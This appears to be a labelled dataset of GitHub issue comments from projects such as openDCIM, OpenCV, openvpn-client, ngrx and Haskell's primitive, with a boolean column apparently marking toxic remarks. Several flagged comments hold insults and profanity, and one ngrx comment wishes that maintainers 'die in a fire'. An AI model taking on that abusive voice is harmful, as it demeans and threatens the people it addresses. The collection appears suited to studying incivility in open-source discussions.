openDCIM/samilliken/1114/450204639,,False,True,False,openDCIM/samilliken/1114
openDCIM/samilliken/1114/392282326,"I found that in upgrading to 18.2, ldap stopped working for me. It's using 'cn' attribute in the login_ldap.php, which is common name, which according to the ldapwiki  do not use 'cn' names for groups, we use 'uid' for groups, along with memberUid. Changing to use 'uid' works. Time for another LDAP config parameter? ",False,True,False,openDCIM/samilliken/1114
openDCIM/samilliken/1114/450204921,,False,True,False,openDCIM/samilliken/1114
openDCIM/samilliken/1114/450204022,"It really isn't used.  I use (|(userprincipalname=%userid%)(cn=%userid%)) as my base search and i'm matching on the princpalname in my search string.  You just need to use a better search string. ♠$found_dn=@$ldapResults[0]['cn'][0];               $ldapSearchDN=str_replace(""%userid%"",$found_dn,html_entity_decode($config-&gt;ParameterArray['LDAPBaseSearch']));` ",False,True,False,openDCIM/samilliken/1114
openDCIM/samilliken/1114/450203312,"No, it's not. Look at line 146 in login_ldap.php $found_dn=@$ldapResults[0]['cn'][0]; For a ldap instance using rfc2307, this does not work. ",False,True,False,openDCIM/samilliken/1114
openDCIM/samilliken/1114/450204449,"We do not use 'CN' here in rfc2307 groups, it's uid. (&amp;(objectClass=posixGroup)(memberUid=%userid%)) ",False,True,False,openDCIM/samilliken/1114
openDCIM/samilliken/1114/450205307,Set your usersearch to (|(uid=%userid%)) then and stop spamming my email with your lack of ldap filtering ,False,True,False,openDCIM/samilliken/1114
openDCIM/samilliken/1114/450212363,"Please submit a working pull request.   As I have stated countless times before - I don't know LDAP and barely got this to work with the example I managed to steal from the Google.    However, if you simply want to tell me that we're doing it wrong, that's not productive.    Working pull requests are welcome. ",False,True,False,openDCIM/samilliken/1114
openDCIM/samilliken/1114/450212046,"&lt;img width=""490"" alt=""screenshot 2018-12-27 13 05 07"" src="" this is the full extent of your user object the problem you are experiencing is that your user object isn't presenting the list of groups it is a member of and that is how the code is searching. &lt;img width=""512"" alt=""screenshot 2018-12-27 13 06 32"" src="" an actual understanding of the code I can again say that point where CN is listed is essentially useless and does next to nothing.  What you are suggesting whether you realize it or not is that we need to pull the list of users from each group and then check for membership on a per user basis or you're missing information from the ldap search. ",False,True,False,openDCIM/samilliken/1114
openDCIM/samilliken/1114/450206853,"group searches is what is broken.                             $ldapSearchDN=str_replace(""%userid%"",$found_dn,html_entity_decode($config-&gt;ParameterArray['LDAPBaseSearch']));  so, no, what your propose does not change the fact it's using CN and not uid. so stop posting stupid answers. ",True,True,False,openDCIM/samilliken/1114
openDCIM/samilliken/1114/450220825,"It's now obvious that Pig does not understand LDAP rfc2307 either. Group membership is a separate object from the user object in rfc2307, and membership is denoted using uid or the uid object (rfc2307 vs rfc2307bis). so using 'cn' to search for group membership in a rfc2307 schema fails. And no, I was not going to post the complete object in a public forum. ",False,True,False,openDCIM/samilliken/1114
openDCIM/samilliken/1114/450221443,"I understand ldap and have worked with it for nearly 20 years. I'm not bothering quoting RFCs, i'm posting the actual code and how it is working.  It isn't using the CN for searching for groups it searching for the memberof attribute or the nested DN attribute for people using openldap.  I posted the actual loop that is determining group membership. ",False,True,False,openDCIM/samilliken/1114
openDCIM/samilliken/1114/450222330,"and when the group search fails, that loop will return nothing, because it's searching for groups based on CN, not UID in a rfc2307 schema. ",False,True,False,openDCIM/samilliken/1114
openDCIM/samilliken/1114/450223017,"By adding in an error log statement at   of something to the effect of error_log($ldapSearchDN); Then again another to show the contents of $config-&gt;ParameterArray['LDAPBaseDN'] we can take those values and throw them into the following search against AD from the values that I have said will work at this point in the code where CN is essentially doing nothing. [wilbur@friend openDCIM]$ ldapsearch -x -b ""DC=ad,DC=wilpig,DC=org"" -D ""tablesb@friend.wilpig.org"" -h 10.0.0.243 -W '(|(userprincipalname=Limited User)(cn=Limited User))' The CN value was pulled from an earlier ldap search so that we are just now matching again against a known value that was pulled from ldap and this time around we are looking for the memberof statements. This is NOT searching for groups based on CN it is actually attempting to just lookup the same object htat we already loaded again because we love to do things repeatedly.  So while you are harping on a CN value it actually does nothing.  that entire section can be removed and have no real issues. Stop quoting me RFC and read the god damned code. ",True,True,False,openDCIM/samilliken/1114
openDCIM/samilliken/1114/450224347,Remove lines 144 150 in your codebase. ,False,True,False,openDCIM/samilliken/1114
openDCIM/samilliken/1114/450223766,"1st, we do not have anything like you posted, open your damn eyes. 2nd, the ldapresults are over written  in the else statement, that then calls an for loop, that then calls the checkaccess read the GD code your self.  Start at line 128, and not that ldapResults are overwritten at line 150. ",False,True,False,openDCIM/samilliken/1114
openDCIM/samilliken/1114/450221473,"from login_ldap.php, line 148 this code has a hard-coded 'cn' in it, so it assumes activedirectory type member changing it to 'uid' and everything works. ",False,True,False,openDCIM/samilliken/1114
openDCIM/samilliken/1114/450224927,"So in other words, you do not support RF2307, only your self determined Schema's. Too bad. ",False,True,False,openDCIM/samilliken/1114
openDCIM/samilliken/1114/450225930,Defined Attributes for RFC2307  some of the attributes defined in [RFC2256] are required. Further down the hole for rfc2307 we find what are the requirements for group membership.  your RFC comments in this case CN is required. ,False,True,False,openDCIM/samilliken/1114
openDCIM/samilliken/1114/450251164,The section of code you are looking at is pulling a user object.  NOT a group. ,False,True,False,openDCIM/samilliken/1114
openDCIM/samilliken/1114/450250964,"Our schema already has a 'cn' attribute in the userobject. You are the clueless one.  Look up groups under RFC2307.  They do NOT use 'cn', they use either member, memberOf, or memberUid.  These are NOT attached to the userObject at all. This is NOT active directory.  This is openldap running a RFC2307 schema. ",False,True,False,openDCIM/samilliken/1114
openDCIM/samilliken/1114/450224735,"I've read the code, I wrote the code, You clearly aren't following the logic and have some bizarre schema in your environment.  I have this code working against a standard AD back end as well as an openldap back end without any issues.  If you are doing pure posix and don't have common names defined, not my problem.  We have common names to help identify groups so we don't have to remember ID numbers.  I'm not changing the code for your self imposed issues. ",True,True,False,openDCIM/samilliken/1114
openbmc/openbmc/1665/231079509,Needs to be refactored to use new c++ / sdbusplus functions and move to new xyz.openbmc_project dbus base.  This appears to be an internally used only application which means phase 6. ,False,True,False,openbmc/openbmc/1665
openbmc/openbmc/1665/477441252,This issue has been automatically marked as stale because no activity has occurred in the last 6 months. It will be closed if no activity occurs in the next 30 days. If this issue should not be closed please add a comment. Thank you for your understanding and contributions. ,False,True,False,openbmc/openbmc/1665
openDCIM/samilliken/1114/450251574,I've given you a work around for your issue to remove lines 144150 in your codebase and yet you are still choosing to argue about what you don't understand in the code.  I'm locking this thread.  Feel free to submit a pull request with valid working code. ,False,True,False,openDCIM/samilliken/1114
opencv/opencv/12198/412343725,"At first, it is better to contact with your own layer. From technical side, OpenVINO dependency is optional and disabled in default builds (so there are no such questions by default). You need proper OpenVINO installation  during OpenCV build step during running of OpenCV-based apps So you need to agree with OpenVINO license in both cases.  ",False,True,False,opencv/opencv/12198
openbmc/openbmc/1665/487253311,This issue has been closed because no activity has occurred in the last 7 months. Please reopen if this issue should not have been closed. Thank you for your contributions. ,False,True,False,openbmc/openbmc/1665
opencv/opencv/12198/349756292,"  System information (version)    OpenCV =&gt; 3.4.2 Operating System / Platform =&gt; Any Compiler =&gt; Any ##### Detailed description  Is there any developer discussion about not only including OpenVino's inference engine, but making it the default back-end when it is included? I went to enable this back end and ended up swimming in legal documents using scary terms about patent rights and such. So, I'm trying to figure out where the developer discussion about this took place to maybe help me understand the legal implications of leaning on apparently proprietary and patent-encumbered dependencies. I wasn't sure whether to discuss this here or on the answer site, but just in case, I've opened the same discussion there as well. Please feel free to close this out if the answers site is the better site.   Steps to reproduce  Try to enable Intel inference engine. Start a gofundme to go back to school for the next decade to become a lawyer in order to determine how much of your soul the engine requires, how many of your descendants it includes, or if you'll be filing for bankruptcy soon.  ",False,True,False,opencv/opencv/12198
opencv/opencv/12198/412349242,Its unfortunate that there's so much cautionary documentation about ffmpeg and friends but not such a word about this. But I guess it makes sense since it's Intel that you're agreeing to in this case. ,False,True,False,opencv/opencv/12198
opencv/opencv/12198/412350121,"Id just hate to see this project go the way of other projects where they turned from open source community works to shills bound exclusively to proprietary, closed corporate interest. The backend shouldn't be promoted as the default in my opinion at least, because 1) it is a legal nightmare and promotes a single corport interest 2) it runs like garbage on non-intel hardware, obviously as it is designed to, because it promotes a single corporate interest. My 2 cents. There are open standards, independent of vendors, emerging that overlap the majority of opencv's functionality. As a developer I'll take vender neutral every time over even a hint of corporate interest masquerading as ""open source"". ",False,True,False,opencv/opencv/12198
opencv/opencv/12198/412452375,"plus one for @friend  I'm not english fluent, so it's difficult for me to understand everything around legal in the Intel documents, but I share @friend feeling, and I completely agree with his request. FYI, I myself wanted to use Intel software with my students, when I discovered the legal nightmare Intel introduces when using such resources. The project has been canceled, and we use other solutions (OpenCV is still in the list, of course). For OpenCV credibility, Intel Vino engine shouldn't be included nor associated to OpenCV image. Maybe as ""contrib, but I'm not completely sure. My 2 cents --  ericb ",False,True,False,opencv/opencv/12198
opencv/opencv/12198/412458664,"This dependency is optional, disabled by default, and it will not be turned ON if there is no OpenVINO installation in your system. If you doesn't have OpenVINO installation on your system and building OpenCV from sources, then you may skip read of these related legal documents (because you don't use OpenVINO - it is simple, right?). Alternatively, there are ready-to-use pre-built binaries of OpenCV in OpenVINO package. You can use them under terms of OpenVINO license. ",False,True,False,opencv/opencv/12198
opencv/opencv/12198/412552595," Inference Engine from OpenVINO is not complied in nor supplied with OpenCV by default. You need to apply special effort to download it and enable.  If you download OpenVINO from Intel site, there is be special build of OpenCV as a part of OpenVINO, and it comes with Inference Engine support compiled in and enabled by default. By default is not the same as the only available, i.e. you can still switch to our C++ or OpenCL implementation from OpenCV. Again, it's solely your decision to download and install it. You do not have to do it if you have any doubts. You can always take OpenCV from github and build it without Inference Engine (which is the default behavior, see above). OpenVINO acts as OpenCV DNN accelerator; it does not add any new functionality. Any topology that you can run using Infererence engine backend you can also run without using Inference Engine (well, except for the proprietary models from Intel Model Zoo). In OpenCV we have a big chunk of tests to check DNN correctness in both modes - when it uses IE and when it does not. The whole purpose of making Inference Engine the default backend when it's included into the build is to get automatic acceleration of DL inference without having to modify the source code. Sometimes you get 20% acceleration, sometimes you get 3x acceleration. Not bad for a piece of proprietary software. Inference Engine is only enabled on x64 arch. When you build OpenCV for ARM, MIPS, PowerPC, OpenRISC etc. there is no Inference Engine there and consequently it's not enabled. Just in case you are not aware of it, but for a few years already OpenCV is built by default with another proprietary closed-source library from Intel, Integrated Performance Primitives library, which is used by default to accelerate image processing operations. And yes, you can disable it as well if you have any doubts. Forbes states that Intel has promised to release OpenVINO open-source, and hopefully that will happen soon. If you can provide absolutely free and open-source backend that will beat Inference Engine on the popular topologies, we will gladly add support for it and make the default backend in OpenCV DNN.  I think, the discussion can be closed now, since it does not look constructive. ",False,True,False,opencv/opencv/12198
opencv/opencv/12198/412564451,"[edited] @friend, please, consult with your legal and stop using this conversation style ",False,True,False,opencv/opencv/12198
openshot-qt/OpenShot/1619/326970634,open shot has been great but my most recent video never played when i hit play which made it difficult to cut and edit also when i was done and went to review the video would pause in the same spot every single fucking time it is getting to the point to were i dont wanna use the application any more and when i go to export it would always stop at 32% every single time and it would later say not responding and that was the first time to ever happen in all of my editing and i would open other projects and everything is fine and i know for a fact it is not my video cause i review my videos before i even bother editing so i just dont understand that why now is openshot acting like a piece of shit and not working properly cause i never had this problem before until today ,True,True,False,openshot-qt/OpenShot/1619
openshot-qt/OpenShot/1619/392483545,@friend - Please report issues in a polite manner. We can't help you if you post stuff like this. We need you to tell us the problem and provide details of the system you are running Openshot on. Thanks. ,False,True,False,openshot-qt/OpenShot/1619
opensource-socialnetwork/opensource-socialnetwork/1365/432724140,"Make sure to install Ossn in a clean directory and there's no old .htaccess file lying around. In case you installed Ossn in a subdirectory, other parent .htaccess files may have an unwanted influence, too. To circumvent create a sub-domain pointing directly to your Ossn installation. You may use the verifyperms.php tool which is part of  to check your installation. ",False,True,False,opensource-socialnetwork/opensource-socialnetwork/1365
opensource-socialnetwork/opensource-socialnetwork/1365/373467241,"You don't have permission to access /installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation////installation/ on this server. Additionally, a 403 Forbidden error was encountered while trying to use an ErrorDocument to handle the request. Have as well message my hosting company and they told me the issue is with the script ",False,True,False,opensource-socialnetwork/opensource-socialnetwork/1365
opensource-socialnetwork/opensource-socialnetwork/1365/432748724,"Like seriously i don't understand the clean directory order than the public_html/ where i unzipped the file already create the database and i have seen the installation where to insert the database credentials, have done all that before i ran into that You don't have permission to access n////installation////installation////installation/ on this server. Additionally, a 403 Forbidden error was encountered while trying to use an ErrorDocument to handle the request. Please help to break it down ",False,True,False,opensource-socialnetwork/opensource-socialnetwork/1365
opentoonz/opentoonz/346/156095639,"I found ""Memos"" very useful , between other things, as a help to syncronize sound with animation. Now it has a bug (03) Case of you delete the first character  (04) The character color turn white  ",False,True,False,opentoonz/opentoonz/346
opentoonz/opentoonz/346/220823967,I agree this is annoying and needs to be fixed. There is a small workaround ( if you do not already know it ) ). -open the style editor. -then select the memo text and you should get arrow at the side  this will give you the text properties which will allow you to reapply the the colour with the style editor. ,False,True,False,opentoonz/opentoonz/346
opentoonz/opentoonz/346/221821386,Thank you ! ,False,True,False,opentoonz/opentoonz/346
opentoonz/opentoonz/346/222092113,Modification merged. ,False,True,False,opentoonz/opentoonz/346
opentoonz/opentoonz/346/222094370,Great thank you ! ,False,True,False,opentoonz/opentoonz/346
openvpn-client/dperson/165/445474064,"I don't think it a good idea to use link. We should create a network first, then find a way to put all the traffic through the vpn gateway. So did you manually write a gateway inside your other containers? ",False,True,False,openvpn-client/dperson/165
openvpn-client/dperson/165/445484206,"The other container doesn't get a network stack of it's own, but uses the one configured by the openvpn-client container. Go ahead and make your own containers that do that, but you'll have to modify all containers that you use to be able to route their traffic to your openvpn container. ",False,True,False,openvpn-client/dperson/165
openvpn-client/dperson/165/445484420,"oooow okey but then it doesn't work for a vpn provider then.  There is then 2 usecases, the one where the vpn provider gives an ip to the container clients of the vpn container. And the one where only the vpn container gets an IP and where you need to put everything in a network and change the gateway for the client container.... ",False,True,False,openvpn-client/dperson/165
openvpn-client/dperson/165/445484739,I really am not following what you're saying here ,False,True,False,openvpn-client/dperson/165
openvpn-client/dperson/165/445484795,which vpn did you take in your example with transmission for example? ,False,True,False,openvpn-client/dperson/165
openvpn-client/dperson/165/445485041,"I'm personally using PIA, but there are users that have contacted me for probably a dozen or so VPN providers, so don't think it's all that relavent. ",False,True,False,openvpn-client/dperson/165
openvpn-client/dperson/165/445485104,"Man, if it's impossible to talk to you then so be it but then say so directly Because if the goal is to deny everything I say while I encountered a major problem with your setup then you are loosing my time but also yours ",False,True,False,openvpn-client/dperson/165
openvpn-client/dperson/165/445485326,"where in all that  does it create a network stack? Nowhere... Nor PIA nor mullvad nor protonmail nor nordvpn doesn't give a bunch of addresses, they give one for each connection you make. So the containers behind if they are only in the same network stack of your openvpnclient they won't get any ip addresses ",False,True,False,openvpn-client/dperson/165
openvpn-client/dperson/165/445485426,"I built the container, and have been supporting it for quite a while. It's not just my personal use that I'm commenting from but how things have worked out for other users of it. This is issue number 165, I've answered and resolved to the best of my ability 164 prior question / issues that people have run into. The openvpn container does create a network stack, it's the other container that doesn't, as you stated in the first message ",False,True,False,openvpn-client/dperson/165
openvpn-client/dperson/165/445485502,"well apparently it doesn't do that anymore in 18.09 because if I do docker network ls, there isn't a forth network ",False,True,False,openvpn-client/dperson/165
openvpn-client/dperson/165/445485680,"and I don't see that you put a dhcp server in your container and as I stated earlier, vpn provider doesn't provide with a bunch of addresses. So if the docker daemon doesn't provide for an ip address I don't see how the other containers would have one ",False,True,False,openvpn-client/dperson/165
openvpn-client/dperson/165/445485794,"You're looking at the container connected to the VPN container, your first message references . If you are following the directions from my container you're telling docker to not create a network for that container and to reuse the one from the VPN. So when you look at the network for  there is nothing there, because it didn't get it's own network stack. ",False,True,False,openvpn-client/dperson/165
openvpn-client/dperson/165/445485942,"As docker won't be administering the VPN directly, I have no idea if it will show the IP address handed out by the VPN provided to the container even if you pull the network settings for the VPN container, it may well only show the docker assigned IP. I've never checked. ",False,True,False,openvpn-client/dperson/165
openvpn-client/dperson/165/445486041,"and that I don't see that becoming true. As I said there is no dhcp server anywhere in that, unless the vpn that your container is using is a private one where the openvpn connection act as a dhcp relay, or you attach your container to another network. And now you are telling me that the vpn is providing addresses... LOL show me where PIA is giving away multiples addresses on one connection. And no there is no ip assigned even in the container itself ",False,True,False,openvpn-client/dperson/165
openvpn-client/dperson/165/445486445,"I provide this container and answer questions for fun, you're being rather rude while I'm trying to help you. I'm not inclined to bother much further. I guarantee you that it is currently working for me and many others, and that I'm trying to answer your questions so that it will work for you as well. ",False,True,False,openvpn-client/dperson/165
openvpn-client/dperson/165/445486679,"that was rude so you were rude well before me, just saying. and again you are giving me details of your vpn container but you actually not understanding what I'm saying. And as I said, PIA gave you ONE ip and ONLY ONE because of your connection, that doesn't mean that the container which are behind this vpn container are receiving one! Gosh is that so complicated to understand? ",True,True,False,openvpn-client/dperson/165
openvpn-client/dperson/165/445486759,I didn't show you the content of your vpn container on my installation. The vpn container on my build is working. I was talking about container behind that container. ,False,True,False,openvpn-client/dperson/165
openvpn-client/dperson/165/445487002,"No one ever suggested that all containers that used the VPN containers network stack got their own IP, I explicitly said multiple times that they didn't get IPs assigned at all. ",False,True,False,openvpn-client/dperson/165
oqimporta-theme/brasadesign/9/66182779,@friend consegue me explicar isso? ,False,True,False,oqimporta-theme/brasadesign/9
organization/az-digitalag/7/430570892,"Check w/ scott rohde about whether we are sticking w/ gitbook or moving to bookdown Metadata section currently assumes data is being entered via the web interface need to split this out into rails web UI, using SQL, using R, using (future) flask API probably should discuss which of these will be the preferred methods and when ",False,True,False,organization/az-digitalag/7
ownpass/ownpass/19/179754188,"Hi guys, Just an issue to notify you guys of what's going on. Instead of writing that here I've created a Google Group. Please see this link ",False,True,False,ownpass/ownpass/19
ownpass/ownpass/19/252478689,Added a new update ,False,True,False,ownpass/ownpass/19
periodicjs.ext.reactadmin/repetere/59/215778570,Page navigation is working on all pages except going from 404 to another page. Requires double click ,False,True,False,periodicjs.ext.reactadmin/repetere/59
phase-0/phase-0/140/287290730,"2.3 Udacity HTML and CSS Lesson 2 Ok, let's get things moving...  [ ] Start your Toggl timer. [ ] Complete Udacity CSS Frameworks, Responsive Layouts. [ ] Download the files as they provide them and follow along yourself (even if you have to pause the video!)   [ ] In the waffle comments, note down what you thought of the Udacity tutorial. What were the parts you enjoyed / benefited from the most? Is there anything that confused you?  [ ] For extra learning, complete the Udacity Bootstrap and Other Frameworks tutorial. (This isn't mandatory, but will help you in the long run as a front-end developer)   ",False,True,False,phase-0/phase-0/140
piwik/piwik/3405/37354048,"Reported in forums The goal is to make archiving faster for high traffic piwik server, especially those with thousands of websites. They can exceute php /path/to/cron/archive.php multiple times in parallel, and each instance will archive different websites. Overall it should be much faster than archiving one after the other. NOte it used to work as I tested this case when building the feature, but was broken at some point. ",False,True,False,piwik/piwik/3405
pipeline-issues/daisy-consortium/158/31394185,"From marisa.d...@friend.com on March 28, 2012 235900 Frontmatter is required in ZedAI, whereas it is optional in DTBook.  create a dtbook with no frontmatter convert it to zedai using the dtbook-to-zedai script see that the validation fails  To see the intermediate output, go to dtbook-to-zedai.convert.xpl and uncomment the plog step on line 286.  This output can be validated manually to get more detailed information. Original issue ",False,True,False,pipeline-issues/daisy-consortium/158
piwik/piwik/3405/48309548,(In [7042]) Fixes #3405 Skipping websites which have been processed by another concurrent archive.php ,False,True,False,piwik/piwik/3405
piwik/piwik/3405/48309550,It should work yes! ,False,True,False,piwik/piwik/3405
piwik/piwik/3405/48309549,"Will it work if archive.php is launched on different servers but for the ""same"" database ? ",False,True,False,piwik/piwik/3405
piwik/piwik/3405/48309552,This is a great thing ) ,False,True,False,piwik/piwik/3405
piwik/piwik/3405/48309554,In 0ea3b0e69954b7a4c57c43da0e72d70ba0678f43 Refs #3405 Refactoring archive.php so I can understand it well ,False,True,False,piwik/piwik/3405
piwik/piwik/3405/48309553,It's not working in 2.0 ,False,True,False,piwik/piwik/3405
piwik/piwik/3405/48309555,In 5db45de92582cfd5cef4a0c9ff6622b9f41d37b3 Fixes #3405 Clearning up the code and fixing the logic so archive.php will process websites properly when executed concurrently! ,False,True,False,piwik/piwik/3405
piwik/piwik/3405/48309556,In ea612f9fad44a76429b6972d1a29043f42eae09a Refs #3405 Fixing build ,False,True,False,piwik/piwik/3405
piwik/piwik/3405/48309557,"In ac3b5bf1ab198cd30b361da4e2c849b6dc5f3149 Fixes #4309 adding --force-idsites=1,2,n parameter Refs #3405 fixing regression in concurrent runs ",False,True,False,piwik/piwik/3405
piwik/piwik/3405/48309558,See follow up #4903     Add possibility to run multiple archiver in parallel ,False,True,False,piwik/piwik/3405
platform/ngrx/1248/350114476, doesn't receive data. Where do you initalize loading from http api? Your example app doesn't show so many things. And again all resources are behind a paywall or don't explain anything. The ... browser plugin shows that the store is populated with data. Why is there no data displayed? ,False,True,False,platform/ngrx/1248
platform/ngrx/1248/412593101,Support questions should be asked on stackoverflow (with a ngrx tag) or the gitter channel. ,False,True,False,platform/ngrx/1248
platform/ngrx/1248/413497951,... assholes ,True,True,False,platform/ngrx/1248
platform/ngrx/1254/351147160,Your software is an undocumented trap to extort money by selling courses and books. You're pieces of shit that need to die in a fire. Go fuck yourselves ,True,True,False,platform/ngrx/1254
playpen/thestinger/20/23309279,"It ended up being mostly C because all of the relevant APIs are C, so this would probably make sense. It's always a short-lived path to exec or exit so there's not even resource cleanup to worry about. ",False,True,False,playpen/thestinger/20
playpen/thestinger/20/23311150,This is done now. ,False,True,False,playpen/thestinger/20
playpen/thestinger/20/23311228,"Also, no more dependency on python to generate the system call list because libseccomp added it to the API. ",False,True,False,playpen/thestinger/20
prideR/PRIDE-R/13/50745731,"As a user it would be great to have a general statistics (number of proteins, projects and psms) by Instrument ",False,True,False,prideR/PRIDE-R/13
prideR/PRIDE-R/13/65932685,"Since this package includes just the core functionality provided by the PRIDE Archive web service, that additional functionality will be created in a separate package (e.g. ",False,True,False,prideR/PRIDE-R/13
primitive/haskell/71/283993879,In case anybody wants to get started with this  primitive-0.6.2.0 doesn't compile with ghc 8.4.1 alpha ,False,True,False,primitive/haskell/71
primitive/haskell/71/353456554,"Use hackage head.  It has everything building for head On Thu, Dec 21, 2017 at 322 PM GeorgeCo notifications@friend.com wrote ",False,True,False,primitive/haskell/71
primitive/haskell/71/353456920,"@friend - why not release this package to Hackage now, so people can just use hackage? I personally don't know what it takes to use Hackage head, and have little enthusiasm for plumbing it through all my CI scripts... ",False,True,False,primitive/haskell/71
primitive/haskell/71/353574170,"I would very much appreciate a Hackage release working with GHC 8.4.1 alpha, too.  has a lot of reverse dependencies (224 direct ones), even more if you consider them transitively. As a consequence, quite a few popular packages like  are broken right now with 8.4.1. I don't think it's a sensible solution to tell hundreds of dependent projects ""Hey, just fiddle around with your CI scripts..."". ;-)  is very near to the bottom of the whole Hackage dependecy tree, so it would be a pity if it delayed tons of other projects. IMHO the whole point of the GHC alpha releases is to fix such breakage early, so we have a healthy ecosystem when the final release comes out. ",False,True,False,primitive/haskell/71
primitive/haskell/71/353657365,"I’ll check with the rest of the maintainers and we’ll make sure to gift yah with something nice for Xmas @friend and Ryan any thoughts ? On Fri, Dec 22, 2017 at 553 AM Sven Panne notifications@friend.com wrote ",False,True,False,primitive/haskell/71
primitive/haskell/71/353657636," and Dan are the two active uploaders at present On Fri, Dec 22, 2017 at 202 PM Carter Schonwald carter.schonwald@friend.com wrote ",False,True,False,primitive/haskell/71
primitive/haskell/71/353664000,"GHC 8.4.1 is currently still a moving target and it's too early to release to Hackage (and I personally advise strongly against; Hackage releases are intended to be durable). Fwiw, I devised  so we wouldn't need to make releases for an unreleased GHC, even less so for an alpha release for which GHC HQ gives no API stability guarantees whatsoever. I for one won't make any releases specifically for GHC 8.4.1 support before the first release candidate of GHC 8.4.1 hasn't been cut (and thus its API is frozen). ",False,True,False,primitive/haskell/71
primitive/haskell/71/353671219,"Agreed and better said than I ) On Fri, Dec 22, 2017 at 247 PM Herbert Valerio Riedel  notifications@friend.com wrote ",False,True,False,primitive/haskell/71
primitive/haskell/71/353686581,"I'm less than satisfied with this attitude Do you really think it is a good idea to tell hundreds of project to change their CI? What should people using stack do? Is it really that hard for a relatively small project at the bottom of the food chain to make a new release? It's totally clear that GHC's APIs are not frozen yet, but even if they change before the final release Just make a small fix and release again. Given this resistance, I really have a hard time seeing the value of GHC alpha releases... ",True,True,False,primitive/haskell/71
primitive/haskell/71/353705320,"when did these hundreds of projects add alpha release ghc to their CI? either way its an alpha release and its high holidays in several continents, be patient and enjoy time with friends and fam.  anyone testing software out when its hot off of alpha tags can be a tad patient ) merry xmas ",False,True,False,primitive/haskell/71
primitive/haskell/71/353857574,"Are you saying ""this package will be released after Christmas"" or ""this package will be released once GHC is in beta""? Is GHC HQ saying ""put this alpha through its paces"" or ""it's too early""? CC @friend, as I feel this impacts the GHC release cycle speed quite a bit (still working out the kinks in the new process, so no great shock at this stage!) Happy Christmas! ",False,True,False,primitive/haskell/71
primitive/haskell/71/353884834,"Doesn't  support custom snapshots. Could stack users collaborate and make a custom snapshot with git dependencies to ""supposed to work with GHC-8.4.1-alpha"" commits? ",False,True,False,primitive/haskell/71
primitive/haskell/71/353887505,"@friend yes, they could, it’s a great time idea - but probably orthogonal (I certainly don’t use stack for alpha testing) ",False,True,False,primitive/haskell/71
primitive/haskell/71/353893173,"CAbal supports multiple package dbs. What’s wrong with hackage head? On Mon, Dec 25, 2017 at 238 PM Neil Mitchell notifications@friend.com wrote ",False,True,False,primitive/haskell/71
primitive/haskell/71/353921549,"@friend, I understand your general point about API instability, but in this particular case it's absurd. The API change that is holding this package down (implementing the  proposal) is one that was formally proposed on the library list and formally accepted and implemented. It is not going to be reversed before the  release. Moreover, even if it were reversed, there is no downside to supplying  instances as required. It is true that the way the  instances were changed in 7e6e7b4667020b61986c60e0c2d642e700e7966d is incompatible with (hypothetically) reverting that change. Making it compatible would be a matter of adding  where required. This issue is annoying everyone; please fix it. ",True,True,False,primitive/haskell/71
primitive/haskell/71/354082694,"@friend not that the issue has anything to do with stack but ... considering the amount of work for creating and maintaining (tracking all git repo update) a stack snapshot for something that is ephemeral, I think the likely outcome is that it won't happen, lowering the amount of testing GHC alpha gets and the feedback GHC Devs gets back. Even if that stack snapshot happens, who will sweat to add this to their travis which will have to be undone once 8.4 is released ? I think if you don't use the same mechanism of delivery for everything then you're making the testing bar way too high already. Clearly if there's no release of  (and other basic packages), I don't think anyone should bother with alpha or beta releases (haskellers or GHC devs) compared to say, testing GHC git repo directly. ",False,True,False,primitive/haskell/71
primitive/haskell/71/354131832,I’ll see about getting primitive in shape in a few days.  Right now this thread isn’t helping in a positive way. ,False,True,False,primitive/haskell/71
primitive/haskell/71/354236722,"nice tone policing + psych 101 course + insults from cartazio. Now can you let an actual real maintainer (close/wontfix/ignore/resolve) this issue ? I'ld like to know if we can expect to be able to test with non-final GHC 8.4; I personally have tried many time in the past to add non final ghc to my package builds and be stuck with unreleased primitive (or other packages), just like people commenting and watching this issue. ",True,True,False,primitive/haskell/71
primitive/haskell/71/354133924,"I’ve locked the thread to prevent more drive by non constructive remarks. Positive reinforcement and collaboration are way more effective way to motivate folks, and honestly framing your heated remarks in terms of personal feelings or motivations would be more constructive than how some posters have approached it. Hypothetical positive remark “I would really like to test ghc 8.4 alpha with vanilla hackage and a release of primitive , because for structural reasons I can’t edit my cabal config in my homedir  to point to two package sources even though that’s supported. The reasons why I can’t include xyz. Additionally I want to make sure my software works on day zero of the final ghc 8.4 release and better sooner than later )“ I might be totally wrong on that last point but I do believe you can have your cabal config in your home dir point Either way, valid perspectives have been articulated, but drive by commenting isn’t actionable, and if not done in the right way can be demotivating. Vincent your comment did not add anything constructive or new. Shame on you.  You just did a more confrontational exaggerated version of what was already reasonably articulated by Neil and David. Happy New Years all, I’m off to visit my younger sister for a week of rest.  Use positivity and positive reinforcement to motivate folks. And in the future please  explain why tools like hackage head aren’t effective options for you to test libraries on an alpha quality compiler release please.  Explaining WHY in terms of actions or work flows or implicit needs we don’t know about is helpful. ",False,True,False,primitive/haskell/71
